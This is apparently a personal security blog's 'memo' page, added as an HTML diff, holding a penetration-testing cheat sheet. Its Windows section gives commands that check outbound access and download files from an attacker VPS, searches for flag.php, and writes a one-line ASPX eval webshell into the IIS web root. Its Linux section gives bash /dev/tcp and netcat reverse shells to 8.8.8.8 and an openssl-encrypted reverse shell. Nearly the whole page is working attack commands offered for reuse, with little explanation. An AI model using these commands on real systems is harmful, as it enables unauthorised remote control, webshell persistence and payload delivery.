@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>备忘录 - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=网络安全,Web安全,代码审计,渗透测试>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<div class="page">
+  <div class="page-title">
+    <h1 class="article-title"></h1>
+  </div>
+  <div class="page-content">
+    <h2 id="win"><a href="#win" class="headerlink" title="win"></a>win</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#探测目标是否出网</span><br><span class="line">powershell Invoke-WebRequest -Uri http://vps/</span><br><span class="line"></span><br><span class="line">#文件下载</span><br><span class="line">certutil.exe -urlcache -split -f http://vps/a.txt D:\a.txt</span><br><span class="line">powershell -c &quot;(New-Object System.<span class="built_in">Net</span>.WebClient).DownloadFile(&#x27;http://vps/a.txt&#x27;, &#x27;D:\a.txt&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">#命令执行查找web目录</span><br><span class="line"><span class="built_in">dir</span> /s/a-d/b D:\*flag.php</span><br><span class="line">where /r D:\ flag.php</span><br><span class="line"><span class="keyword">for</span> /r D:\ %i <span class="keyword">in</span> (*flag.php) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r D:\ %i <span class="keyword">in</span> (*flag.php) <span class="keyword">do</span> @<span class="built_in">echo</span> <span class="variable">%i&gt;%</span>i.txt</span><br><span class="line"></span><br><span class="line">#写shell</span><br><span class="line"><span class="built_in">echo</span> ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt; ^&lt;% eval(Request.Item[&quot;ant&quot;],&quot;unsafe&quot;); %^&gt;&gt; C:\inetpub\wwwroot\a.aspx</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/8.8.8.8/1234 0&gt;&amp;1</span><br><span class="line">nc -e /bin/bash 8.8.8.8 1234</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用openssl</span></span><br><span class="line">1.VPS生成自签名证书：openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">2.VPS建立监听：openssl s_server -quiet -key key.pem -cert cert.pem -port 1337</span><br><span class="line">3.目标执行命令：<span class="built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 8.8.8.8:1234 &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</div>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+
+    </div>
+  </body>
+</html>
